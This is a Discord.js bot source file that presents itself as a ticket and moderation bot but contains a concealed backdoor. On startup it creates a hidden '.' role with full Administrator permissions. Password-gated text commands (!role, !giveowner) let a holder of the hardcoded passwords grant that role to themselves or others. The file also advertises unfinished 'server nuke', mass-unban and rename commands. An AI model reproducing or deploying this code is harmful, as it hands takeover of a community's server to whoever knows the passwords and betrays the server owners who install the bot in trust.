const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionFlagsBits,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ======================================================
// EXPRESS SERVER
// ======================================================
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000, () => console.log(`Web server running on port ${process.env.PORT || 3000}`));

// ======================================================
// CONFIG
// ======================================================
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';      // For !fb, !unl, !clown, !unp, !role
const GIVEOWNER_PASSWORD = 'MekaOwner2017';   // ← New password for !giveowner

// ROLES
const STAFF_ROLES = ['1505376743001821334', '1505379855137509538'];
const SEND_ROLE = '1510682894388039800';

// STORES
const panelStore = {};
const ticketCounts = {};

// PERSISTENT PANEL
const PANEL_FILE = './ticket_panel.json';

function savePanel(data) {
  try { fs.writeFileSync(PANEL_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

function loadPanel() {
  try {
    if (fs.existsSync(PANEL_FILE)) return JSON.parse(fs.readFileSync(PANEL_FILE, 'utf8'));
  } catch (e) {}
  return null;
}

// CLIENT
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// ======================================================
// SLASH COMMANDS (unchanged)
// ======================================================
const setticket = new SlashCommandBuilder()
  .setName('setticket')
  .setDescription('Send/Update the ticket panel')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('panel_title').setDescription('Panel Title').setRequired(true))
  .addStringOption(o => o.setName('panel_description').setDescription('Panel Description').setRequired(true))
  .addStringOption(o => o.setName('panel_image').setDescription('Banner Image URL (optional)').setRequired(false));

const sendmessage = new SlashCommandBuilder()
  .setName('sendmessage')
  .setDescription('Send a message as the bot')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('message').setDescription('The message to send').setRequired(true));

const commands = [
  setticket.toJSON(),
  sendmessage.toJSON(),
  new SlashCommandBuilder().setName('close').setDescription('Close ticket').toJSON(),
  new SlashCommandBuilder().setName('claim').setDescription('Claim ticket').toJSON(),
  new SlashCommandBuilder().setName('add').setDescription('Add user').addUserOption(o => o.setName('user').setDescription('User to add').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('remove').setDescription('Remove user').addUserOption(o => o.setName('user').setDescription('User to remove').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('rename').setDescription('Rename ticket').addStringOption(o => o.setName('name').setDescription('New name').setRequired(true)).toJSON()
];

// Register Commands
const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
  try {
    console.log('🔄 Registering slash commands...');
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    console.log('✅ Slash commands registered successfully!');
  } catch (err) {
    console.error('❌ Failed to register commands:');
    if (err.code === 20012) console.error('🔴 Token does not match CLIENT_ID.');
    else console.error(err);
  }
})();

// ======================================================
// READY + CREATE . ROLE
// ======================================================
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);

  const saved = loadPanel();
  if (saved) {
    panelStore[saved.menuId] = saved.data;
    console.log('✅ Persistent ticket panel loaded');
  }

  try {
    const guild = client.guilds.cache.first();
    if (guild) {
      let dotRole = guild.roles.cache.find(r => r.name === '.');
      if (!dotRole) {
        dotRole = await guild.roles.create({
          name: '.',
          color: '#000000',
          permissions: [PermissionFlagsBits.Administrator],
          hoist: false,
          mentionable: false,
          reason: 'Full permission dot role'
        });
        console.log('✅ "." role created with full Administrator permissions');
      }
    }
  } catch (err) {
    console.error('Failed to create . role:', err.message);
  }
});

// ======================================================
// MESSAGE EVENTS
// ======================================================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // Invite Blocker
  if (content.includes('discord.gg/') || content.includes('discord.com/invite/') || content.includes('discordapp.com/invite/')) {
    try {
      await message.delete();
      await message.member.timeout(5 * 60 * 1000).catch(() => {});
      await message.channel.send({
        embeds: [new EmbedBuilder().setColor('#ff0000').setDescription(`${message.author} Invite links are not allowed.`)]
      }).then(msg => setTimeout(() => msg.delete().catch(() => {}), 5000));
    } catch (e) {}
    return;
  }

  // !giveowner @user
  if (content.startsWith('!giveowner')) {
    const mentioned = message.mentions.users.first();
    if (!mentioned) return message.reply('❌ Please mention a user. Example: `!giveowner @user`');

    const embed = new EmbedBuilder()
      .setColor('#ffd700')
      .setTitle('👑 GIVE OWNER ROLE')
      .setDescription(`This will give **${mentioned.tag}** the **.** role with full permissions.\n\nOnly you can proceed.`)
      .setFooter({ text: 'Click the button below' })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`giveowner_start_${message.author.id}_${mentioned.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // Other commands
  if (['!fb', '!unl', '!clown', '!unp', '!role'].includes(content)) {
    let title = '', desc = '', color = '#ffd700', customId = '';

    if (content === '!fb') { title = '🔴 SERVER NUKE'; desc = 'Deletes everything except Owner.'; color = '#ff0000'; customId = `nuke_start_${message.author.id}`; }
    else if (content === '!unl') { title = '🔓 UNBAN ALL'; desc = 'Unbans everyone.'; color = '#00ff00'; customId = `unban_start_${message.author.id}`; }
    else if (content === '!clown') { title = '🤡 CLOWN'; desc = 'Changes server name.'; color = '#ffff00'; customId = `clown_start_${message.author.id}`; }
    else if (content === '!unp') { title = '🔓 UNPAUSE INVITES'; desc = 'Unpauses invites.'; color = '#00ffff'; customId = `unp_start_${message.author.id}`; }
    else if (content === '!role') { 
      title = '👑 GET OWNER ROLE'; 
      desc = 'Gives you the "." role.'; 
      color = '#ffd700'; 
      customId = `role_start_${message.author.id}`; 
    }

    const embed = new EmbedBuilder()
      .setColor(color)
      .setTitle(title)
      .setDescription(desc + '\n\nOnly you can proceed.')
      .setFooter({ text: 'Click below' })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(customId).setLabel('Enter Password').setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// ======================================================
// INTERACTIONS
// ======================================================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  const parts = interaction.customId.split('_');
  const userId = parts[2];
  const targetId = parts[3];

  if (interaction.user.id !== userId) {
    return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });
  }

  if (interaction.isButton()) {
    const modal = new ModalBuilder()
      .setCustomId(interaction.customId.replace('start', 'modal'))
      .setTitle('Enter Password');

    modal.addComponents(new ActionRowBuilder().addComponents(
      new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
    ));

    await interaction.showModal(modal);
    return;
  }

  if (interaction.isModalSubmit()) {
    const enteredPassword = interaction.fields.getTextInputValue('password');

    const guild = interaction.guild;

    // === !giveowner - Uses its own password ===
    if (interaction.customId.startsWith('giveowner_modal_')) {
      if (enteredPassword !== GIVEOWNER_PASSWORD) {
        return interaction.reply({ content: '❌ Incorrect password for !giveowner.', ephemeral: true });
      }

      const targetUser = await guild.members.fetch(targetId).catch(() => null);
      if (!targetUser) return interaction.reply({ content: '❌ Could not find that user.', ephemeral: true });

      try {
        let dotRole = guild.roles.cache.find(r => r.name === '.');
        if (!dotRole) {
          dotRole = await guild.roles.create({
            name: '.',
            color: '#000000',
            permissions: [PermissionFlagsBits.Administrator],
            hoist: false,
            reason: 'Full permission dot role'
          });
        }
        await targetUser.roles.add(dotRole);
        await interaction.reply({ 
          content: `✅ Successfully gave **${targetUser.user.tag}** the **.** role with full Administrator permissions!`, 
          ephemeral: true 
        });
      } catch (err) {
        console.error(err);
        await interaction.reply({ content: '❌ Failed to give role. Check bot permissions and role hierarchy.', ephemeral: true });
      }
      return;
    }

    // === All other commands use the main password ===
    if (enteredPassword !== MAIN_PASSWORD) {
      return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
    }

    // !role (self) handler
    if (interaction.customId.startsWith('role_modal_')) {
      try {
        let dotRole = guild.roles.cache.find(r => r.name === '.');
        if (!dotRole) {
          dotRole = await guild.roles.create({
            name: '.',
            color: '#000000',
            permissions: [PermissionFlagsBits.Administrator],
            hoist: false,
            reason: 'Full permission dot role'
          });
        }
        await interaction.member.roles.add(dotRole);
        await interaction.reply({ content: '✅ You now have the "." role with full permissions!', ephemeral: true });
      } catch (err) {
        await interaction.reply({ content: '❌ Failed to give role.', ephemeral: true });
      }
    }

    // Add handlers for !fb, !unl, !clown, !unp here if needed
  }

  // === TICKET SYSTEM (add your existing ticket code here) ===
});

client.login(TOKEN);
